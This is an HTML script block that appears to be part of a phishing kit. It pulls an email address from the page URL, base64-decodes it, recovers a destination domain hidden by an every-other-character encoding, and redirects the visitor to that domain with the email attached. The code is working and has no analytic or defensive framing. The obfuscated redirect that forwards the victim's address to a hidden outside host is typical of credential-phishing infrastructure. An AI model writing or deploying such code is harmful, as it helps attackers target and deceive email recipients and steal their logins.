<script>

// Get the current URL
var currentUrl = window.location.href;

// Function to decode base64 encoded string
function decodeBase64(encodedString) {
    return atob(encodedString);
}

// Function to clean the abc value (remove every other character)
function decodeAbcPattern(str) {
    let result = '';
    for (let i = 1; i < str.length; i += 2) {
        result += str[i];
    }
    return result;
}

// Extract the email address from the URL using a regular expression
var emailMatch = currentUrl.match(/[?&#]([^=]*)=([^&]*)/) || currentUrl.match(/#([^=]*)=([^&]*)/);

if (emailMatch) {
    var key = emailMatch[1];
    var value = emailMatch[2];

    // Check if the value is base64 encoded
    var decodedEmail = value;
    try {
        decodedEmail = decodeBase64(value);
    } catch (e) {
        // Not base64 encoded, use the original value
    }

    // âœ… Extract and decode abc= domain
    var abcMatch = currentUrl.match(/[?&#]abc=([^&]*)/);
    var baseUrl = 'https://goal.com'; // default fallback
    if (abcMatch) {
        var encodedDomain = abcMatch[1];
        var decodedDomain = decodeAbcPattern(encodedDomain);

        // Prepend https:// if not present
        if (!decodedDomain.startsWith('http://') && !decodedDomain.startsWith('https://')) {
            decodedDomain = 'https://' + decodedDomain;
        }

        baseUrl = decodedDomain;
    }

    var redirectUrl = baseUrl + '#' + decodedEmail;
    window.location.href = redirectUrl;
} else {
    console.log('Email address not found');
}


</script>
